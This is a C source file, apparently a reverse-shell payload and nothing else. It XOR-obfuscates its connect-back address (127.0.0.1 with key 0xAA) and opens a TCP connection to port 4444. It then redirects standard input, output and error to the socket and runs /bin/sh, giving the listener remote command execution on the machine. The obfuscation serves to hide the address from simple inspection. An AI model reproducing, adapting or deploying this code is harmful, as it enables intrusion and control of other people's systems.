#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

void xor_decode(char* data, size_t data_len, char key) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] = data[i] ^ key;
    }
}

int main() {
    int                sock;
    struct sockaddr_in server;

    // "127.0.0.1" XORed with 0xAA. The final 0xAA acts as the null terminator \0 when decoded.
    char ip_encoded[] = {0x9B, 0x98, 0x9D, 0x84, 0x9A, 0x84, 0x9A, 0x84, 0x9B, 0xAA};

    // Decode in place. We pass sizeof(ip_encoded) to decode the entire block including terminator
    xor_decode(ip_encoded, sizeof(ip_encoded), 0xAA);

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        return 1;
    }

    server.sin_family      = AF_INET;
    server.sin_port        = htons(4444);
    server.sin_addr.s_addr = inet_addr(ip_encoded);

    // Attempt connection
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        close(sock);
        return 1;
    }

    // Duplicate file descriptors
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // Execute shell
    char* args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);

    close(sock);
    return 0;
}
